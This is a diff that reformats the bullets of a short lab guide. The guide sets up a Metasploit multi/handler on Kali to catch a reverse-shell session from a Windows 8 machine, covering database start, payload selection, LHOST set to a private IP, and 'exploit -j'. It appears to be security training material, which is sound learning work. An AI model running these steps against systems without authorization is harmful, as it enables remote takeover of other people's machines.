@@ -3,25 +3,25 @@
 Check your **IP ADDRESS** for both your kali and your windows8 system ensure to ping to both devices and get a response, go to your kali and start your **POSTGRESQL START** and also your **MSFDB INIT** service.
 
 
--**START YOUR MSFCONSOLE**.it primary a command line used to scan target system for known vulnerabilities. 
+- **START YOUR MSFCONSOLE**: it primary a command line used to scan target system for known vulnerabilities. 
 
--**SEARCH MULTI/HANDLER**.
+- **SEARCH MULTI/HANDLER**.
 
--**USE 7**.
+- **USE 7**.
 
--**SHOW PAYLOADS**.
+- **SHOW PAYLOADS**.
 
--**SET PAYLOAD 1315**.
+- **SET PAYLOAD 1315**.
 
--**SHOW OPTIONS**.
+- **SHOW OPTIONS**.
 
--**SET LHOST TO YOUR IP ADDRESS 192.168.0.15**.
+- **SET LHOST TO YOUR IP ADDRESS 192.168.0.15**.
 
--**SHOW OPTIONS.**
+- **SHOW OPTIONS.**
 
-_**EXPLOIT -j**
+- **EXPLOIT -j**
 
--**RUN**
+- **RUN**
 
 TYPE HELP FOR OTHER OPTIONS ON YOUR WINDOWS SYSTEM.
 
